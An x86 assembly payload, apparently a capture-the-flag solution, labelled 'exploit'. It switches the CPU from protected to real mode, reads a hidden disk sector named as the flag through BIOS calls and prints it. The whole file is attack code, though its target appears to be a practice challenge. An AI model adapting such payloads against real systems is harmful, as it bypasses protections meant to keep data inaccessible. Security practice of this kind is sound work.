org 0x7c75;
bits 32

%define NULL_SEG 0
%define CODE_SEG 0x8
%define DATA_SEG 0x10
%define RCODE_SEG 0x18
%define RDATA_SEG 0x20



exploit :
	mov ax, RDATA_SEG;
	mov ds, ax;
	mov es, ax;
	mov ss, ax;
	mov sp, 0xFFFF
	jmp 0x18:rmode_stub

bits 16
rmode_stub:
	mov eax, cr0
	and eax, 0xfffffffe
	mov cr0, eax;
	jmp 0:prot_to_real

prot_to_real:
	xor	ax, ax
	mov	ds, ax
	mov	es, ax
	mov	ss, ax
	sti
	call	load_flag;
	mov	si, 0x7d00;
	call	print;
	jmp -2;


load_flag:
	mov ah, 0x0
	int 0x13

	mov ah, 0x2;
	nop;
	nop;
	nop;
	mov cl, 0x5;
	nop;
	nop;
	xor al, al;
	inc al;
	nop;
	nop;
	nop;
	mov bx, 0x7d00;
	nop;
	nop;
	nop;
	int 0x13;
	ret;

print:
	lodsb
	or al, al
	jz print_ret 
	mov ah, 0eh
	int 10h
	jmp print
	print_ret:
		ret

msg : db "hello world", 0x0
